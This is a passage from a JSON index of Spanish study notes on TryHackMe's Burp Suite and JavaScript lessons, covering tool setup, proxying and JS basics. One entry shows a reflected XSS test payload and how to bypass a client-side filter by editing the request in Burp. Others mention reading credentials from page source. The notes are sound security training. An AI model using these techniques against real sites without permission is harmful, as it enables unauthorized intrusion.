    "content": "Al fin llegamos a uno de los aspectos más importantes del uso del proxy de Burp: el **Scoping**.\n\nCapturar y registrar el tráfico puede resultar abrumador e inconveniente, especialmente cuando sólo queremos concentrarnos en ciertas aplicaciones web. Aquí es donde entra el scoping.\n\nAl configurar un scope a nuestro proyecto, podemos definir qué pasa por el proxy y queda registrado y qué no. La manera más fácil de hacerlo es cambiando a la pestaña `Target`, hacer click derecho en nuestro objetivo de la lista, a la izquierda, y seleccionar `Add to Scope`. Entonces Burp nos preguntará si queremos parar de registrar cualquier cosa que no esté en el scope, a lo que diremos `yes`.\n\n![[Pasted image 20251005194715.png]]\n\nPara comprobar nuestro scope, podemos ir a la subpestaña **Scope settings** en la pestaña **Target**.\n\nEsto nos permite controlar incluyendo o excluyendo dominios o IPs. De todas formas, si desactivamos el registro para el tráfico fuera del scope, el proxy seguirá interceptando todo. Para evitar esto, debemos ir a **Proxy settings** y seleccionar `And URL Is in target scope` desde la sección \"Intercept Client Requests\".\n\n![[Pasted image 20251005195115.png]]\n"
  },
  {
    "title": "5. The Dashboard",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/5-the-dashboard/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/5. The Dashboard.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Para lanzar el programa escribe `burpsuite` en tu terminal. Una vez abierto y aceptados los términos y condiciones, podremos seleccionar un tipo de proyecto. En la versión Community las opciones son limitadas y puedes pulsar `Next` directamente.\n\nLa siguiente ventana nos permite elegir la configuración para Burp Suite. Generalmente conviene dejar los ajustes predeterminados. Haz click en `Start Burp`.\n\nEl dashboard de Burp está dividido en 4 partes:\n\n![[Pasted image 20251004021343.png]]\n\n1. **Tasks:** Permite definir tareas en segundo plano que Burp Suite realizará mientras usas la aplicación. En la versión Community, la tarea por defecto \"Live Passive Crawl\", que automáticamente registra las páginas visitadas es suficiente.\n2. **Event Log:** Ofrece información acerca de las acciones realizadas por Burp Suite, como ejecutar el proxy, o detalles sobre las conexiones de Burp.\n3. **Issue Activity:** Esta sección es sólo de Burp Suite Professional. Muestra las vulnerabilidades identificadas por el escáner automático, posicionado por severidad y filtrable basado en la certeza de la vulnerabilidad.\n4. **Advisory:** Ofrece información detallada sobre las vulnerabilidades identificadas, incluyendo referencias y remedios sugeridos. Esta información puede ser exportada a un reporte.\n\nA lo largo de las pestañas y ventanas de Burp Suite veras unos signos de interrogación. Hacer click en ellos abre una nueva ventana con información de ayuda específica para esa sección."
  },
  {
    "title": "10. Site Map and Issue Definitions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/10-site-map-and-issue-definitions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/10. Site Map and Issue Definitions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "La pestaña **Target**  en Burp Suite ofrece más que simple control sobre el scope de nuestro testeo. Consiste en tres subpestañas:\n\n1. **Site map:** Esta nos permite mapear la web que estamos enfocando en estructura de árbol. En Burp Suite Professional esto se conjunta con el escaneo/fuzzeo automático de web para dar una visión más amplia. Aun así, con Burp Suite Community, se puede usar durante la fase de escaneo, lo que es tremendamente útil para mapear webs y APIs ya que las APIs serán accedidas por la web.\n2. **Issue Definitions:** Aunque la versión de comunidad no incluye la funcionalidad de escaneo de vulnerabilidades completa, todavía podemos usarla con una cantidad razonable de vulnerabilidades a escanear. Esta sección ofrece una lista extensiva de vulnerabilidades web.\n3. **Scope settings:** Este ajuste nos permite controlar el scope del objetivo en Burp Suite. Nos permite excluir/incluir dominios en el scope de nuestro testeo. Haciendo esto podemos centrarnos en el tráfico que queremos capturar.\n\n-------------------------\n<h2>Reto</h2>\n"
  },
  {
    "title": "11. The Burp Suite Browser",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/11-the-burp-suite-browser/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/11. The Burp Suite Browser.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Si la tarea anterior te pareció muy complicada, descansa. Esta será mucho más simple.\n\nAdemás de poder modificar nuestro navegador para trabajar con el proxy, Burp Suite incluye su propio navegador, el cual ya está conectado con este por defecto. Simplemente haz click en `Open Browser`.\n\nSi ejecutas Burp Suite como el usuario root, puede ser que no se te abra el navegador de Burp. Puedes solucionarlo de dos maneras:\n\n1. Crea un nuevo usuario y ejecuta Burp Suite en una cuenta sin privilegios.\n2. Ve a `Settings -> Tools -> Burp's Browser` y marca la opción `Allow Burp's browser to run without a sandbox`.\n   \n>[!CAUTION] Aunque esta segunda manera funciona, puede significar un riesgo de seguridad para ti, cuidado.\n   \n   "
  },
  {
    "title": "6. Navigation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/6-navigation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/6. Navigation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "En Burp Suite, la navegación por defecto es mayormente hecha mediante las barras del menú superior, que permiten cambiar entre módulos y acceder a varias subpestañas dentro de cada uno.\n\nAsí funciona:\n\n1. **Selección de Módulo:** La fila superior muestra un menú de barra con los módulos disponibles en Burp Suite.\n2. **Subpestañas:** Si un módulo seleccionado tiene múltiples pestañas, puede accederse a ellas a través de un segundo menú de barra que aparece por debajo del primero.\n3. **Desfijando Pestañas:** SI prefieres ver múltiples pestañas separadas, puedes desfijarlas en una ventana diferente. Para hacer esto, ve a la opción `Window` y selecciona \"Detatch\" junto a la/s pestaña/s que quieras desfijar.\n\nBurp Suite también ofrece atajos de teclado para navegación rápida. Por defecto, los siguientes están disponibles:\n\n| Atajo              | Pestaña   |\n| ------------------ | --------- |\n| `Ctrl + Shift + D` | Dashboard |\n| `Ctrl + Shift + T` | Target    |\n| `Ctrl + Shift + P` | Proxy     |\n| `Ctrl + Shift + I` | Intruder  |\n| `Ctrl + Shift + R` | Repeater  |\n"
  },
  {
    "title": "4. Installation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/4-installation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/4. Installation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Burp Suite es una de esas herramientas que viene muy bien tener a mano. Ya sea para temas de aplicaciones web o móvil, pentesting, bug bounty, etc.\n\n---------------------\n<h2>Descargas</h2>\nPara descargar la última versión para otros sistemas puedes ir a esta página [web](https://portswigger.net/burp/releases/).\n\n- **Kali Linux:** Burp Suite viene pre instalado con kali. En caso de que falte puedes instalarla desde los repositorios `apt` de tu sistema.\n- **Linux, macOS y Windows:** Para otros sistemas operativos, PortSwigger ofrece instaladores dedicados para Burp Suite.\n\n--------------------\n<h2>Instalación</h2>\nUsa el sistema apropiado para tu sistema operativo. Si no usas `sudo` durante la instalación, se instalará en tu directorio `/home` y no será añadido a tu PATH."
  },
  {
    "title": "8. Introduction to the Burp Proxy",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/8-introduction-to-the-burp-proxy/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/8. Introduction to the Burp Proxy.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "El proxy de Burp es una herramienta fundamenta y crucial. Permite capturar las peticiones y respuestas entre el cliente y el servidor. Este tráfico interceptado puede ser manipulado, mandado a otras herramientas o dejado pasar para llegar a su destino.\n\n----------------------\n<h2>Fundamentos para entender Burp Proxy</h2>\n- **Interceptar Peticiones:** Cuando estas se hacen a través del proxy de Burp, son capturadas y prevenidas de llegar a su destino. Esta petición aparece en la pestaña de Proxy, permitiendo diferentes acciones. Para permitir que pasen sin interceptar hay que poner `Intercept is on` en `off` dándole click.\n- **Tomar Control:** La habilidad de interceptar peticiones empodera a los testers a ganar control total sobre el tráfico web.\n- **Capturar y Logging:** Burp captura y registra peticiones incluso cuando `Intercept is off`. Esto puede ser muy útil para análisis posterior.\n- **Soporte WebSocket:** También captura y registra comunicación WebSocket, ofreciendo asistencia adicional al analizar aplicaciones web.\n- **Logs e Historial:** Las peticiones capturadas pueden ser vistas en el historial HTTP y el historial de WebSockets.\n\n------------------\n<h2>Algunas funciones notables en loa ajustes Proxy</h2>\n- **Interceptar Respuestas:** Por defecto, proxy no intercepta las respuestas del servidor a no ser que lo especifiquemos. Para ello podemos modificar la tabla de \"Intercept responses based on following rules\" (básicamente configurar reglas para la interceptación).\n- **Match y Reemplazo:** Esta sección permite el uso de expresiones regulares (regexp) para modificar las peticiones entrantes y salientes. Esto permite cambios dinámicos como modificar el agente o manipular las cookies."
  },
  {
    "title": "3. Features of Burp Community",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/3-features-of-burp-community/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/3. Features of Burp Community.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Aunque Burp Suite Community ofrece un conjunto más limitado de funcionalidades, sigue siendo impresionante. Sus herramientas son altamente valiosas para testear aplicaciones web. Exploremos algunas de sus características principales:\n\n- **Proxy:** El Proxy de Burp es el aspecto con más renombre. Permite interceptar y modificar peticiones y respuestas mientras interactuamos con aplicaciones web.\n- **Repeater:** Permite capturar, modificar y remandar la misma petición múltiples veces. Especialmente útil al crear payloads mediante prueba y error.\n- **Intruder:** Aún con la limitación de frecuencia, permite mandar peticiones a endpoints. Comúnmente utilizado para ataques de fuerza bruta o de fuzzeo.\n- **Decoder:** Ofrece un valioso servicio para transformación de información.\n- **Comparer:** Como el nombre sugiere, habilita la comparación entre elementos de información ya sea a nivel de palabra o de byte.\n- **Sequencer:** Típicamente utilizado cuando se intenta descifrar un token, si le faltaba randomizado al generarse se puede exponer a ataques.\n\nAdemás de las funcionalidades pre-implementadas, la base de código de Java facilita el desarrollo de extensiones para aumentar su funcionalidad. Estas pueden ser escritas en Java, Python (usando el intérprete Java-Python), o Ruby (usando el intérprete Java-JRuby). El módulo **Burp Suite Extender** permite la rápida y fácil carga de extensiones en el marco de trabajo mientras que el marketplace, **BApp Store**, permite descargar módulos de terceros. Aunque algunas extensiones requieren tener una licencia, sigue habiendo muchas que no lo necesitan, como por ejemplo **Logger++**."
  },
  {
    "title": "9. Connecting through the Proxy (FoxyProxy)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/9-connecting-through-the-proxy-foxyproxy/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/9. Connecting through the Proxy (FoxyProxy).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Para usar el proxy de Burp Suite, necesitamos configurar nuestro navegador local para redirigir el tráfico a través de Burp Suite. En esta tarea, nos enfocaremos en configurarlo usando la extensión **FoxyProxy**.\n\n1. **Instalación:** Descarga la extensión de FoxyProxy.\n2. **Acceso:** Una vez instalada, un botón con el icono de un zorro aparecerá. Haz click en él.\n3. **Crear configuración:** Dale a las opciones y después a `Add`.\n4. **Añade detalles:** En la página que aparece, rellena los valores:\n   - Título: `Burp`\n   - Proxy IP: `127.0.0.1`\n   - Puerto: `8080`\n5. **Guarda:** Haz click en `Save` para guardar la configuración.\n6. **Actívala:** Haz click en el icono de FoxyProxy y selecciona la configuración de Burp.\n   \n   >[!IMPORTANT] Si no enciendes Burp Suite y activas FoxyProxy no podrás mandar peticiones web.\n\n7. **Habilita:** Activa el `Intercept is on` en Burp Suite.\n\n"
  },
  {
    "title": "2. What is Burp Suite",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/2-what-is-burp-suite/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/2. What is Burp Suite.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "En esencia, Burp Suite es un framework basado en Java diseñado para funcionar como una solución comprensiva para realizar pentesting de aplicaciones web y móviles. Se ha convertido en un estándar en la industria.\n\nBurp Suite captura y habilita la manipulación de todo el tráfico HTTP/HTTPS entre el navegador y el servidor. Interceptando peticiones, el usuario tiene flexibilidad para enrutarlas a varios componentes. La capacidad de interceptar, ver, manipular y redirigir las peticiones web hace de Burp Suite una herramienta de valor incalculable.\n\nBurp Suite está disponible en varias versiones pero nos centraremos en el uso de Burp Suite Community Edition. Aunque también ofrece Burpsuite Professional y Enterprise que requieren licencia pero vienen con herramientas más avanzadas.\n\n1. **Burp Suite Professional** es una versión de Burp Suite sin restricciones. Trae funcionalidades como:\n   \n   - Un escáner de vulnerabilidades automático.\n   - Un fuzzer/brute-forcer que no está limitado por la frecuencia.\n   - Guardar proyectos para futuro uso y generación de reportes.\n   - Una API que permite la integración con otras herramientas.\n   - Acceso no restringido a añadir nuevas extensiones para mejores funcionalidades.\n   - Acceso a Burp Suite Collaborator.\n   \n   Es una herramienta altamente potente, haciéndola la elección favorita de los profesionales.\n\n2. **Burp Suite Enterprise**, en contraste, es primordialmente usada para escaneo continuo. Dispone de un escáner automatizado que periódicamente escanea aplicaciones web en busca de vulnerabilidades. Al contrario que las otras dos versiones, esta corre en un servidor y constantemente escanea las aplicaciones.\n\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "En esta unidad vamos a comprender las funciones básicas de Burp Suite. Nuestro foco se centrará en:\n\n- Una introducción completa a Burp Suite.\n- Una vista por encima pero razonada de las múltiples herramientas disponibles en el marco de trabajo.\n- Una guía detallada del proceso de instalar Burp Suite en nuestro sistema.\n- Navegar y configurar Burp Suite.\n\nTambién introduciremos el núcleo de Burp Suite que es Burp Proxy. Las próximas unidades en referencia a Burp Suite serán más prácticas, mientras que esta que es la primera será más teórica."
  },
  {
    "title": "0. Burp Suite - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/0-burp-suite-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/0. Burp Suite - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/1. Introduction]]\n[[2. What is Burp Suite]]\n[[3. Features of Burp Community]]\n[[4. Installation]]\n[[5. The Dashboard]]\n[[6. Navigation]]\n[[7. Options]]\n[[8. Introduction to the Burp Proxy]]\n[[9. Connecting through the Proxy (FoxyProxy)]]\n[[10. Site Map and Issue Definitions]]\n[[11. The Burp Suite Browser]]\n[[12. Scoping and Targeting]]\n[[13. Proxying HTTPS]]\n[[14. Example Attack]]\n"
  },
  {
    "title": "14. Example Attack",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/14-example-attack/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/14. Example Attack.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Habiendo visto cómo configurar y como usar nuestro proxy, veamos un ejemplo real simplificado:\n\nEmpezaremos visitando el formulario \"Support\" en `http://IP/ticket/`.\n\n![[Pasted image 20251006223732.png]]\n\nEn un pentest de apps web real, testearíamos esto vara una variedad de vulnerabilidades, una de ellas será Cross-Site Scripting (XSS). Si todavía no has visto XSS, se puede pensar como inyectar scripts del lado del cliente (usualmente en JavaScript) en la página web, de tal manera que se ejecuta. Hay varios tipos de XSS, este que veremos es \"Reflected\" ya que sólo afecta a la persona haciendo la petición.\n\n--------------------\n<h2>Walkthrough</h2>\nEscribe `<script>alert(\"Succ3ssful XSS\")</script>` en el campo de \"Contact Email\". Hay un filtro del lado del cliente que nos impide ingresar caracteres especiales, pero esto es fácil de bypassear.\n\nPara ello enviamos la petición con campos válidos y capturamos esta con Burp Suite, donde la cambiaremos. Después hacemos click en **Forward** para dejarla pasar y obtenemos lo esperado.\n\n![[Pasted image 20251006224730.png]]\n"
  },
  {
    "title": "8. Best Practices",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/8-best-practices/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/8. Best Practices.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "En esta lección vemos las mejores prácticas para una página web.\n\n------------------\n<h2>Evita Confiar en la Validación del Lado del Cliente Sólamente</h2>\nUna de las funciones primarias de JS es realizar validación client-side. Sin embargo confiar ciegamente en ella puede llevar a brechas de seguridad, ya que el usuario puede cambiarlo o deshabilitarlo.\n\n--------------------\n<h2>Recapacita antes de Añadir Librerías</h2>\nSi instalas una librería de una fuente poco confiable y resulta no ser segura estarás exponiendo toda tu aplicación web, por eso debes de tener cuidado con las librerías que utilizas.\n\n--------------------\n<h2>Evita Secretos Hardcodeados</h2>\nNunca hardcodees información sensible como contraseñas.\n\n--------------------\n<h2>Minifica y Ofusca tu Código de JavaScript</h2>\nEsta práctica reduce el tamaño, mejora la eficiencia y hace más difícil la lectura del código a los humanos."
  },
  {
    "title": "6. Bypassing Control Flow Statementes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/6-bypassing-control-flow-statementes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/6. Bypassing Control Flow Statementes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "El flujo de control en JS se refiere al orden con el que los bloques y las declaraciones de código son ejecutados en base a ciertas condiciones. JS ofrece varias estructuras de control de flujo como `if-else`, `switch`, `for`, `while` y `do...while`.\n\n---------------------\n<h2>Condicionales en Acción</h2>\nUno de los condicionales más usados es `if-else`. Este permite ejecutar diferentes bloques de código en función de una condición evaluada en `true` (verdadero) o `false` (falso).\n\n<h6>Ejemplo</h6>\n ```html\n <!DOCTYPE html> \n <html lang=\"en\"> \n <head>     \n\t <title>Age Verification</title> \n </head> \n <body>     \n\t <h1>Age Verification</h1>     \n\t <p id=\"message\"></p>      \n\t \n\t <script>         \n\t\t age = prompt(\"What is your age\")         \n\t\t if (age >= 18) {             \n\t\t\t document.getElementById(\"message\").innerHTML = \"You are an adult.\";         \n\t\t } else {             \n\t\t\t document.getElementById(\"message\").innerHTML = \"You are a minor.\";         \n\t\t }     \n\t </script> \n </body>\n </html>\n ```\n\nSi introduces una edad menor de 18 años en el prompt, la página web pondrá que eres menor y en caso contrario pondrá que eres mayor.\n\n--------------------\n<h2>Bypasseando Formularios de Inicio de Sesión</h2>\nImagina que un admin ha hecho una página que contiene internamente el código JS necesario para validar el inicio de sesión. Puedes abrir el código fuente y leer las credenciales."
  },
  {
    "title": "5. Abusing Dialogue Functions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/5-abusing-dialogue-functions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/5. Abusing Dialogue Functions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "Uno de los principales objetivos de JS es ofrecer cajas de diálogo para interactuar con usuarios y actualizar de manera dinámica. JS ofrece funciones pre-incorporadas para esto como `alert`, `prompt` y `confirm`. Estas funciones permiten a desarrolladores mostrar mensajes y obtener confirmación del usuario. Si no se implementan de forma segura, los atacantes pueden explotar sus vulnerabilidades.\n\n-----------------\n<h2>Alert</h2>\nLa función de alerta muestra un mensaje en una caja de diálogo con un botón de `OK`, típicamente usado para notificar al usuario.\n\n![[Pasted image 20250929233432.png]]\n\n------------------------\n<h2>Prompt</h2>\nLa función de prompt muestra una caja de diálogo que pide un input al usuario. Devuelve el valor introducido si se le da a `OK` y `null` si se le da a `Cancel`.\n\n![[Pasted image 20250929233714.png]]\n\n-----------------------\n<h2>Confirm</h2>\nLa función confirm muestra una caja de diálogo con un mensaje y dos botones, `OK` y `Cancel`. Devuelve true si el usuario aprieta en `OK` y false si selecciona `Cancel`.\n\n![[Pasted image 20250929233850.png]]\n\n--------------------\n<h2>¿Cómo Explotan los Hackers la Funcionalidad?</h2>\nImagina que recibes un email de un desconocido con un documento HTML adjunto. El archivo parece inofensivo pero cuando lo abres, contiene JS que cambia tu experiencia en el navegador."
  },
  {
    "title": "0. JavaScript Essentials",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/0-javascript-essentials/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/0. JavaScript Essentials.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/1. Introduction]]\n[[2. Essential Concepts]]\n[[3. JavaScript Overview]]\n[[4. Integrating JavaScript in HTML]]\n[[5. Abusing Dialogue Functions]]\n[[6. Bypassing Control Flow Statementes]]\n[[7. Exploring Minified Files]]\n[[8. Best Practices]]\n"
  },
  {
    "title": "4. Integrating JavaScript in HTML",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/4-integrating-javascript-in-html/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/4. Integrating JavaScript in HTML.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "Esta lección asume que tienes conocimiento básico sobre HTML y su estructura.Esta sección explorará cómo JS puede ser integrada en HTML. Normalmente no se usa para renderizar contenido sino que trabaja con HTML y CSS para crear páginas dinámicas e interactivas. Ha dos formas principales de integrar JS en HTML: internamente y externamente.\n\n---------------\n<h2>JavaScript Interno</h2>\nSe refiere a incrustar el código JS directamente en un documento HTML. Este método es mejor para principiantes porque les permite ver cómo el script interactúa con HTML. El script se inserta entre etiquetas `<script></script>`. Estos pueden ser colocados dentro e la sección `<head>` para códigos que necesiten ser cargados antes de que se renderice el contenido de la página o en el `<body>` donde el código podrá interactuar con los elementos de la página según se carguen.\n\n<h6>Ejemplo</h6>\n```html\n <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <title>Internal JS</title>\n</head>\n<body>\n    <h1>Addition of Two Numbers</h1>\n    <p id=\"result\"></p>\n\n    <script>\n        let x = 5;\n        let y = 10;\n        let result = x + y;\n        document.getElementById(\"result\").innerHTML = \"The result is: \" + result;\n    </script>\n</body>\n</html>\n```\n\nEn este documento HTML estamos usando JS interno. El JS interactúa con el código HTML seleccionando un elemento (`<p>` con id = \"result\") y actualizándo su contenido usando `document.getElementById(\"results\").innerHTML`. Este JS interno es ejecutado cuando el navegador carga la página.\n\n------------------\n<h2>JavaScript Externo</h2>\nEl JS externo implica crear y almacenar código JS en un achivo separado que finaliza con la extensión `.js`. Este método ayuda a los desarrolladores a mantener el documento HTML limpio y organizado. El archivo externo JS puede ser albergado en el mismo servidor que el HTML o en un servidor externo.\n\nPodemos usar el mismo ejemplo para esta vez.\n\nPrimero creamos un archivo `script.js` con el contenido:\n\n```javascript\nlet x = 5;\nlet y = 10;\nlet result = x + y;\ndocument.getElementById(\"result\").innerHTML = \"The result is: \" + result;\n```\n\nY luego creamos el `external.html`:\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>External JS</title>\n</head>\n<body>\n    <h1>Addition of Two Numbers</h1>\n    <p id=\"result\"></p>\n\n    <!-- Link to the external JS file -->\n    <script src=\"script.js\"></script>\n</body>\n</html>\n```\n\nLo que hicimos fue usar el atributo `src` en el `<script>` para cargar el `.js` desde un archivo externo. Cuando el servidor carga la página busca el archivo `script.js` y lo carga. Este enfoque nos permite separar el código JS manteniendo nuestro HTML más limpio.\n\n--------------------\n<h2>Verificar JS Interno o Externo</h2>\nAl hacer pentesting de una aplicación web es importante comprobar si el sitio usa JS interno o externo.Esto puede ser verificado fácilmente mirando el código fuente de la página. Podemos hacerlo haciendo `Ctrl + U`.\n\nSi vemos un `<script>` con un `src` podemos concluir que la página está cargando un `.js` externo."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "JavaScript es un lenguaje popular de scripting que permite a los desarrolladores web añadir funcionalidades interactivas a sitios web que contienen HTML y CSS. Una vez que los elementos HTML se han creado, puedes añadir interactividad como validación, acciones al hacer click, animaciones, etc, mediante JS.\n\nEsta unidad está diseñada como una primera vista de JavaScript. Está enfocada a principiantes y se centra en ver cómo los atacantes usan funcionalidades legítimas para conseguir resultados maliciosos.\n\n-------------------\n<h2>Pre-requisitos</h2>\n[[4. Linux Fundamentals]]\n[[0. Web Application Basics]]\n[[0. How Websites Work]]\n\n-------------\n<h2>Objetivos de aprendizaje</h2>\n- Comprender lo básico de JS\n- Integrar JS en HTML\n- Abusar la Función de Diálogo\n- Bypassear los Statements de Control de Flujo\n- Explorar los Archivos Minified"
  },
  {
    "title": "2. Essential Concepts",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/2-essential-concepts/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/2. Essential Concepts.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "<h2>Variables</h2>\nLas variables son contenedores que te permiten guardar información en ellos. Cada variable tiene un nombre que permite manipularla y referenciarla. En JS hay tres métodos para declarar una variable: `var`, `let` y `const`. Mientras que `var` está orientada a las funciones, `let` y `const` son las dos orientadas a bloques.\n\n----------------\n<h2>Data Types</h2>\nEn JS, los data types definen el tipo de valor que una variable puede contener. Ejemplos son `string`, `number`, `boolean`, `null`, `undefined` u `object`.\n\n-----------------\n<h2>Funciones</h2>\nUna función representa un bloque de código diseñado para realizar una tarea concreta. Dentro de una función, agrupas código que necesita realizar una tarea similar. Por ejemplo si quisieses hacer que se imprimiese el resultado de algo:\n\n```js\n<script>\n        function PrintResult(rollNum) {\n            alert(\"Username with roll number \" + rollNum + \" has passed the exam\");\n            // any other logic to display the result\n        }\n\n        for (let i = 0; i < 100; i++) {\n            PrintResult(rollNumbers[i]);\n        }\n    </script>\n```\n\n\n---------------\n<h2>Loops</h2>\nLos bucles te permiten ejecutar un bloque de código múltiples veces mientras una condición sea cierta. Bucles comunes en JS son `for`, `while` y `do...while`. De esta manera conseguimos no tener, por ejemplo, que llamar 100 veces a la función sino hacer un bucle que la llame.\n\n-----------------\n<h2>Request-Response Cycle</h2>\nEs cuando el navegador (cliente) manda una petición a un servidor y este responde con la información pedida."
  },
  {
    "title": "3. JavaScript Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/3-javascript-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/3. JavaScript Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
